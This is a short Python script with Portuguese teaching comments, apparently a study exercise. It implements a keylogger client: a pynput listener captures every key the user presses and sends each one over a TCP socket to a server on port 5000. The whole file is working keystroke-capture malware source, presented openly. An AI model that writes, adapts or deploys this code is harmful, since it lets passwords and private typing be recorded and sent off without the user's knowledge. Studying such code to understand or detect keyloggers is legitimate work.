import socket
from pynput import keyboard


HOST = socket.gethostname()
# o host tem que utilizar o endereço do servidor para se conectar

PORTA = 5000
# Usando a mesma analogia do server, a porta é por onde de fato os pacotes "entram" no servidor ou seja
# é necessário que seja a mesma porta para que ocorra a comunicação e troca de dados

client_socket = socket.socket()
# Instância do objeto do tipo socket no formatto TCP/IP

client_socket.connect((HOST, PORTA))
# a fução connect estabele a conexão com o servidor
# Quando a connect (conexão) foi estabelecida, o soquete pode ser utilizado para enviar uma solicitação de
# texto para o servidor. O mesmo soquete é que irá ler a resposta.


def on_press(key):
    try:
        keydata = str(key)
        # recebe a tecla digitada  e transforma em string, para as futuras comparações

        client_socket.send(keydata.encode())
        # Envia o número especificado de bytes de dados para um Socket conectado neste caso o socket do servidor

    except Exception:
        raise Exception


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
# Método responsavel prara 'ouvir', 'observar' quais teclas estão sendo precionadas pelo uisuário
